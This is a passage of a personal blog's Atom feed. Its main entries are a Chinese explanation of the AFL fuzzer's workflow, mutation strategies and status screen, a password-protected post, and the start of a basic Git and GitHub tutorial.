href="https://www.cnblogs.com/onepixel/p/7674659.html" target="_blank" rel="noopener">十大经典排序算法（动图演示）</a></p><p><a href="https://www.cnblogs.com/chengxiao/p/6104371.html" target="_blank" rel="noopener">图解排序算法(二)之希尔排序</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-orangec-排序算法font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-orangec-排序算法font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;orange&quot;&gt;&lt;code&gt;C 排序算法
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>AFL详细总结（持续更新）</title>
    <link href="https://muzibing.github.io/2020/08/25/2020.08.24%EF%BC%88145%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/25/2020.08.24（145）/</id>
    <published>2020-08-24T16:00:00.000Z</published>
    <updated>2020-09-02T03:03:00.644Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-afl的流程font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-afl的流程font"></a> <font color="navy"><code>0x00 AFL的流程</code></font></h3><p><img src="/images/145-1.jpg" alt></p><h4 id="font-color-blue1afl整体框架font"><a class="markdownIt-Anchor" href="#font-color-blue1afl整体框架font"></a> <font color="blue"><code>1.AFL整体框架</code></font></h4><blockquote><ol><li><p>main函数先进行初始化和选项处理；</p></li><li><p>执行input文件夹下的预先准备的所有testcase（perform_dry_run），生成初始化的queue和bitmap；</p></li><li><p>通过cull_queue对queue进行精选，减小input的量；</p></li><li><p>然后进行while(1)循环不断进行fuzz。</p></li></ol><p>每次在fuzz一个queue后，就会进入while(1),并重新调用cull_queue()对队列进行精选，而在while(1)具体实现以下过程：</p><ol><li><p>cull_queue()根据top_rated设置queue中的favored标志，对queue进行精选，选出favored</p></li><li><p>判断queue_cur是否为NULL，如果是，则表示已经完成对队列的遍历，queue_cycle++,初始化相关参数，重新开始遍历队列；</p></li><li><p>fuzz queue_cur对应的input文件；</p></li><li><p>判断是否结束，并更新queue_cur和current_entry；</p></li></ol><p>当队列中的所有文件都经过变异测试了，则完成一次”cycle done”;<br>整个队列又会从第一个文件开始，再次继续进行变异，不过与第一次变异不同的是，因为没有随机性，这一次变异就不需要再进行deterministic fuzzing了。而至于什么是deterministic fuzzing，我们在下面的fuzz策略中会作介绍；</p></blockquote><h4 id="font-colorblue2afl的fuzz策略font"><a class="markdownIt-Anchor" href="#font-colorblue2afl的fuzz策略font"></a> <font color="blue"><code>2.AFL的fuzz策略</code></font></h4><blockquote><p>总的来讲，AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</p><ol><li><p>bitflip，按位翻转，1变为0，0变为1</p></li><li><p>arithmetic，整数加/减算术运算</p></li><li><p>interest，把一些特殊内容替换到原文件中</p></li><li><p>dictionary，把自动生成或用户提供的token替换/插入到原文件中</p></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异</p></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</p></li></ol><p>其中，前四项bitflip, arithmetic, interest, dictionary由于其变异方式没有随机性，所以也称为deterministic fuzzing；而havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</p><p><code>bitflip变异</code>：拿到一个原始文件，首先的变异类型就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</p><ul><li>bitflip 1/1，每次翻转1个bit，按照每1个bit的步长从头开始</li><li>bitflip 2/1，每次翻转相邻的2个bit，按照每1个bit的步长从头开始</li><li>bitflip 4/1，每次翻转相邻的4个bit，按照每1个bit的步长从头开始</li><li>bitflip 8/8，每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转</li></ul><p><code>effector map的生成</code>：</p><p>完成bitflip 8/8的同时，还生成了effector map，该作用是对byte进行标记，在对每个byte进行翻转变异时，其新的执行路径与原来的路径不一致时，就对该byte标记为1，表示即为有效的，否则标记为0；这样做的优点是如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</p><ul><li>bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转</li><li>bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转</li></ul><p><code>arithmetic变异</code>：</p><ul><li>arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</li><li>arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</li><li>arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</li></ul><p>加减运算的相关设置在config.h定义，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。此外，AFL会智能的跳过某些arithmetic,第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</p><p><code>interest变异</code>：</p><ul><li>interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</li><li>interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</li><li>interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</li></ul><p>其中interest value的值在config.h已经设定好</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">#<span class="meta-keyword">define</span> INTERESTING_8 \</span></span><br><span class="line">&gt;   <span class="number">-128</span>,         <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span><br><span class="line">&gt;   <span class="number">-1</span>,           <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">0</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">1</span>,            <span class="comment">/*                                         */</span> \</span><br><span class="line">&gt;   <span class="number">16</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">32</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">64</span>,           <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">100</span>,          <span class="comment">/* One-off with common buffer size         */</span> \</span><br><span class="line">&gt;   <span class="number">127</span>           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>可以看到，用于替换的基本都是可能会造成溢出的数;与之前相同，effector map仍然会用于判断是否需要变异；</p><p><code>dictionary变异</code>：</p><ul><li>user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中</li><li>user extras (insert)，从头开始，将用户提供的tokens依次插入到原文件中</li><li>auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中</li></ul><p><code>tokens</code>：</p><p>在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。</p><p><code>havoc变异</code>：</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul></blockquote><h4 id="font-color-blue3bitmapfont"><a class="markdownIt-Anchor" href="#font-color-blue3bitmapfont"></a> <font color="blue"><code>3.Bitmap</code></font></h4><p><img src="/images/145-3.png" alt></p><h3 id="font-colornavy0x01-afl界面介绍font"><a class="markdownIt-Anchor" href="#font-colornavy0x01-afl界面介绍font"></a> <font color="navy"><code>0x01 AFL界面介绍</code></font></h3><p><img src="/images/145-2.png" alt></p><p><code>process timing</code></p><blockquote><p>展示了当前fuzzer的运行时间、最近一次发现新执行路径的时间、最近一次崩溃的时间、最近一次超时的时间。值得注意的是第2项，最近一次发现新路径的时间。如果由于目标二进制文件或者命令行参数出错，那么其执行路径应该是一直不变的，所以如果从fuzzing开始一直没有发现新的执行路径，那么就要考虑是否有二进制或者命令行参数错误的问题了。</p></blockquote><p><code>overall results</code></p><blockquote><p>这里包括运行的总周期数、总路径数、崩溃次数、超时次数。其中，总周期数可以用来作为何时停止fuzzing的参考。随着不断地fuzzing，周期数会不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。一般来说，当其变为绿色时，代表可执行的内容已经很少了，继续fuzzing下去也不会有什么新的发现了。此时，我们便可以通过Ctrl-C，中止当前的fuzzing。</p></blockquote><p><code>cycle progress</code></p><blockquote><p>该部分展示了当前cycle的队列中fuzzer的距离、当前工作的测试用例的ID</p></blockquote><p><code>Map coverage</code></p><blockquote><p>该部分的第一行介绍了碰撞的分支元组，与bitmap成正比；数字的左半部分是当前的输入，右半部分是整个语料库的值。</p></blockquote><p><code>Stage progress</code></p><blockquote><p>这里包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。执行速度可以直观地反映当前跑的快不快，如果速度过慢，比如低于500次每秒，那么测试时间就会变得非常漫长。如果发生了这种情况，那么我们需要进一步调整优化我们的fuzzing。</p></blockquote><h3 id="font-colornavy0x02-afl的相关计算font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-afl的相关计算font"></a> <font color="navy"><code>0x02 AFL的相关计算</code></font></h3><h4 id="font-color-blue1覆盖率计算font"><a class="markdownIt-Anchor" href="#font-color-blue1覆盖率计算font"></a> <font color="blue"><code>1.覆盖率计算</code></font></h4><h3 id="font-color-navy0x03-源码分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-源码分析font"></a> <font color="navy"><code>0x03 源码分析</code></font></h3><h3 id="font-color-navyafl-相关文章font"><a class="markdownIt-Anchor" href="#font-color-navyafl-相关文章font"></a> <font color="navy"><code>AFL 相关文章</code></font></h3><p><strong>安装使用</strong></p><ol><li>AFL入门<br><a href="https://www.cnblogs.com/0xHack/p/9414444.html" target="_blank" rel="noopener">https://www.cnblogs.com/0xHack/p/9414444.html</a></li><li>[原创][新手向] 使用AFL来fuzz upx<br><a href="https://bbs.pediy.com/thread-249179.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249179.htm</a></li><li>[翻译]使用AFL进行fuzz<br><a href="https://bbs.pediy.com/thread-250866.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-250866.htm</a></li><li>AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing<br><a href="https://paper.seebug.org/841/" target="_blank" rel="noopener">https://paper.seebug.org/841/</a></li><li>AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率<br><a href="https://paper.seebug.org/842/" target="_blank" rel="noopener">https://paper.seebug.org/842/</a></li><li>afl-fuzz技术初探<br><a href="https://www.cnblogs.com/WangAoBo/p/8280352.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8280352.html</a></li><li>AFL使用指南<br><a href="http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz/</a></li><li>Fuzz Testing with afl-fuzz (American Fuzzy Lop)<br><a href="https://spin.atomicobject.com/2015/08/23/fuzz-testing-american-fuzzy-lop/" target="_blank" rel="noopener">https://spin.atomicobject.com/2015/08/23/fuzz-testing-american-fuzzy-lop/</a></li></ol><p><strong>白皮书及文档翻译</strong></p><ol><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（一）——使用初体验<br><a href="https://blog.csdn.net/youkawa/article/details/45696317" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/45696317</a></li><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（二）——详细使用说明（README.txt ）<br><a href="https://blog.csdn.net/youkawa/article/details/76405468" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/76405468</a></li><li>使用Afl-fuzz (American Fuzzy Lop) 进行fuzzing测试（三）——技术白皮书（technical whitepaper）<br><a href="https://blog.csdn.net/youkawa/article/details/76615480" target="_blank" rel="noopener">https://blog.csdn.net/youkawa/article/details/76615480</a></li><li>afl技术白皮书笔记(1)<br><a href="https://ljie.space/2018/01/22/afl%E6%8A%80%E6%9C%AF%E7%99%BD%E7%9A%AE%E4%B9%A6%E7%AC%94%E8%AE%B0-1/" target="_blank" rel="noopener">https://ljie.space/2018/01/22/afl技术白皮书笔记-1/</a></li><li>afl-fuzz技术白皮书<br><a href="https://blog.csdn.net/gengzhikui1992/article/details/50844857" target="_blank" rel="noopener">https://blog.csdn.net/gengzhikui1992/article/details/50844857</a></li></ol><p><strong>技术分析</strong></p><ol><li>★★ 漏洞挖掘技术之 AFL 项目分析<br><a href="https://bbs.pediy.com/thread-249912.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249912.htm</a></li><li>[原创]afl-fuzz源码情景分析，详细读码笔记，freemind版本和word版本<br><a href="https://bbs.pediy.com/thread-218671.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-218671.htm</a></li><li>AFL技术实现分析<br><a href="https://blog.csdn.net/qq_32464719/article/details/80592902#comments" target="_blank" rel="noopener">https://blog.csdn.net/qq_32464719/article/details/80592902#comments</a></li><li>★★ AFL内部实现细节小记<br><a href="http://rk700.github.io/2017/12/28/afl-internals/" target="_blank" rel="noopener">http://rk700.github.io/2017/12/28/afl-internals/</a></li><li>★★ AFL文件变异一览<br><a href="http://rk700.github.io/2018/01/04/afl-mutations/" target="_blank" rel="noopener">http://rk700.github.io/2018/01/04/afl-mutations/</a></li><li>AFL改进小试<br><a href="http://rk700.github.io/2018/02/02/afl-enhancement/" target="_blank" rel="noopener">http://rk700.github.io/2018/02/02/afl-enhancement/</a></li><li>★★ AFL-fuzz工具分析<br><a href="https://blog.csdn.net/Chen_zju/article/details/80791268" target="_blank" rel="noopener">https://blog.csdn.net/Chen_zju/article/details/80791268</a></li><li>AFL源码分析笔记(一)<br><a href="https://xz.aliyun.com/t/4628" target="_blank" rel="noopener">https://xz.aliyun.com/t/4628</a></li><li>AFL源码分析1——afl-gcc.c源码分析<br><a href="https://ch4r1l3.github.io/2019/03/05/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901%E2%80%94%E2%80%94afl-gcc-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/05/AFL源码分析1——afl-gcc-c源码分析/</a></li><li>AFL源码分析2——afl-as.c源码分析<br><a href="https://ch4r1l3.github.io/2019/03/06/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902%E2%80%94%E2%80%94afl-as-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/06/AFL源码分析2——afl-as-c源码分析/</a></li><li>AFL源码分析3——afl-as.h源码分析<br><a href="https://ch4r1l3.github.io/2019/03/08/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%903%E2%80%94%E2%80%94afl-as-h%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/08/AFL源码分析3——afl-as-h源码分析/</a></li><li>AFL源码分析4——afl-fuzz.c源码分析1<br><a href="https://ch4r1l3.github.io/2019/03/09/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%904%E2%80%94%E2%80%94afl-fuzz-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%901/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/09/AFL源码分析4——afl-fuzz-c源码分析1/</a></li><li>AFL源码分析5——afl-fuzz.c源码分析2<br><a href="https://ch4r1l3.github.io/2019/03/10/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%905%E2%80%94%E2%80%94afl-fuzz-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902/" target="_blank" rel="noopener">https://ch4r1l3.github.io/2019/03/10/AFL源码分析5——afl-fuzz-c源码分析2/</a></li><li>afl fuzzer 源代码阅读<br><a href="https://www.cnblogs.com/jg01/p/9772700.html" target="_blank" rel="noopener">https://www.cnblogs.com/jg01/p/9772700.html</a></li><li>AFL不同文件结构<br><a href="https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/" target="_blank" rel="noopener">https://barro.github.io/2018/06/afl-fuzz-on-different-file-systems/</a></li><li>Fuzzing workflows; a fuzz job from start to finish<br><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/" target="_blank" rel="noopener">https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/</a></li></ol><p><strong>AFL 项目</strong></p><ol><li>AFL最原始版本,源码地址<br><a href="https://github.com/google/AFL" target="_blank" rel="noopener">https://github.com/google/AFL</a></li><li>[翻译]AFL生态圈 (这篇文章有很多关于AFL的开源项目地址和简单介绍）<br><a href="https://bbs.pediy.com/thread-251051.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251051.htm</a></li><li>AFLplusplus(该工具做了一些集成)<br><a href="https://github.com/vanhauser-thc/AFLplusplus" target="_blank" rel="noopener">https://github.com/vanhauser-thc/AFLplusplus</a></li><li>[分享]关于 fuzz 的 一点总结<br><a href="https://bbs.pediy.com/thread-249986.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-249986.htm</a></li></ol><p><a href="https://www.jianshu.com/p/cc7a486e5adb" target="_blank" rel="noopener">(译)afl-fuzz白皮书</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-afl的流程font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-afl的流程font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="AFL" scheme="https://muzibing.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>网路安全学习库</title>
    <link href="https://muzibing.github.io/2020/08/23/2020.08.23%EF%BC%88144%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/23/2020.08.23（144）/</id>
    <published>2020-08-22T16:00:00.000Z</published>
    <updated>2020-09-13T03:34:30.869Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="eeff9a72cbfa724c06176df1b898e2fa74db76ac2d62ba20c1ef5e75640a8f9c"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Git以及Github的使用教程</title>
    <link href="https://muzibing.github.io/2020/07/29/2020.07.29%EF%BC%88143%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/29/2020.07.29（143）/</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2020-08-23T10:14:39.697Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、Git-教程"><a href="#一、Git-教程" class="headerlink" title="一、Git 教程"></a>一、Git 教程</h3><h4 id="1-Git-介绍"><a href="#1-Git-介绍" class="headerlink" title="1.Git 介绍"></a>1.Git 介绍</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Git (/ɡɪt/) is a distributed version-control system for tracking changes in source code during software development.[8] It is designed for coordinating work among programmers, but it can be used to track changes in any set of files. Its goals include speed,[9] data integrity,[10] and support for distributed, non-linear workflows.[11]  Git was created by Linus Torvalds in 2005 for development of the Linux kernel, with other kernel developers contributing to its initial development.[12] Its current maintainer since 2005 is Junio Hamano. As with most other distributed version-control systems, and unlike most client–server systems, every Git directory on every computer is a full-fledged repository with complete history and full version-tracking abilities, independent of network access or a central server.[13] Git is free and open-source software distributed under the terms of the GNU General Public License version 2.—wiki</p><blockquote><p>Git是一个分布式版本控制系统，用于在软件开发过程中跟踪源代码的变化。它是为协调程序员之间的工作而设计的，但可用于跟踪任何文件集中的更改。其目标包括速度数据完整性以及对分布式非线性工作流的支持。</p><p>Git由Linus Torvalds于2005年创建，用于Linux内核的开发，其他内核开发人员也为Git的初始开发做出了贡献。自2005年以来，它的当前维护者是Junio Hamano。与大多数其他分布式版本控制系统一样，与大多数客户端服务器系统不同，每台计算机上的每个Git目录都是具有完整历史记录和完整版本跟踪功能的成熟存储库，而与网络访问或中央服务器无关。 Git是根据GNU通用公共许可版本2的条款分发的免费和开源软件。</p></blockquote><h4 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2.安装Git"></a>2.安装Git</h4><p><code>Linux</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p><code>Windows</code></p><blockquote><p>在Windows上使用Git，可以从Git官网直接<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">下载安装程序</a>，然后按默认选项安装即可。安装完成后，在开始菜单里找到“Git”-&gt;“Git Bash”，蹦出一个类似命令行窗口的东西，就说明Git安装成功！</p></blockquote><p><code>配置Git用户名</code></p><blockquote><p>这要和配置github的信息要区分开来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br></pre></td></tr></table></figure><h4 id="3-创建版本库"><a href="#3-创建版本库" class="headerlink" title="3.创建版本库"></a>3.创建版本库</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先有必要了解一下版本库的工作区和暂存区：</p><p><img src="/images/143-1.png" alt></p><blockquote><p>如上图所示，工作区有一个隐藏目录<code>.git</code>，这个不算工作区，而是Git的版本库，上图就是在演示将文件从工作区移到版本库中，分为了两步。Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支<code>master</code>，以及指向<code>master</code>的一个指针叫<code>HEAD</code>。</p><p>一定要在空目录下创建</p></blockquote><p><code>初始化</code></p><blockquote><p>将自己创建的空目录变为Git可以管理的仓库</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br></pre></td></tr></table></figure><p><code>把文件添加到版本库</code></p><blockquote><p>第一步，用命令<code>git add</code>告诉Git，把文件添加到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>第二步，用命令<code>git commit</code>告诉Git，把文件提交到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br></pre></td></tr></table></figure><p><code>查看仓库当前状态</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br></pre></td></tr></table></figure><h4 id="4-修改文件"><a href="#4-修改文件" class="headerlink" title="4.修改文件"></a>4.修改文件</h4><blockquote><p>查看修改的内容</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br></pre></td></tr></table></figure><h4 id="5-版本回退"><a href="#5-版本回退" class="headerlink" title="5.版本回退"></a>5.版本回退</h4><p><code>查看历史记录</code></p><blockquote><p>显示从最近到最远的提交日。</p><font size="2">需要友情提示的是，你看到的一大串类似`1094adb...`的是`commit id`（版本号），和SVN不一样，Git的`commit id`不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的`commit id`和我的肯定不一样，以你自己的为准。为什么`commit id`需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，如果还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。</font></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br></pre></td></tr></table></figure><p><code>版本回退</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br></pre></td></tr></table></figure><blockquote><p>上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code>。</p><p>Git的版本回退速度非常快，因为Git在内部有个指向当前版本的<code>HEAD</code>指针，当你回退版本的时候，Git仅仅是把HEAD从指向<code>回退前的状态</code>改为指向<code>回退后的状态</code>，然后顺便把工作区的文件更新了。</p></blockquote><p><code>查看每一次命令的信息</code></p><blockquote><p>要重返未来，用<code>git reflog</code>查看命令历史，以便确定要回到未来的哪个版本。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br></pre></td></tr></table></figure><h4 id="6-撤销修改"><a href="#6-撤销修改" class="headerlink" title="6.撤销修改"></a>6.撤销修改</h4><p><code>丢弃工作区的修改</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>命令<code>git checkout -- readme.txt</code>意思就是，把<code>readme.txt</code>文件在工作区的修改全部撤销，这里有两种情况：</p><ul><li><p>一种是<code>readme.txt</code>自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；</p></li><li><p>一种是<code>readme.txt</code>已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</p></li></ul><p>总之，就是让这个文件回到最近一次<code>git commit</code>或<code>git add</code>时的状态。</p><font size="2">`git checkout -- file`命令中的`--`很重要，没有`--`，就变成了“切换到另一个分支”的命令</font></blockquote><h4 id="7-删除文件"><a href="#7-删除文件" class="headerlink" title="7.删除文件"></a>7.删除文件</h4><blockquote><p>在Git中，删除也是一个修改操作，</p></blockquote><p><code>确实要从版本库中删除该文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line">rm 'test.txt'</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"remove test.txt"</span></span></span><br><span class="line">[master d46f35e] remove test.txt</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 test.txt</span><br></pre></td></tr></table></figure><h3 id="二、Github使用"><a href="#二、Github使用" class="headerlink" title="二、Github使用"></a>二、Github使用</h3><h4 id="1-创建SSH-Key"><a 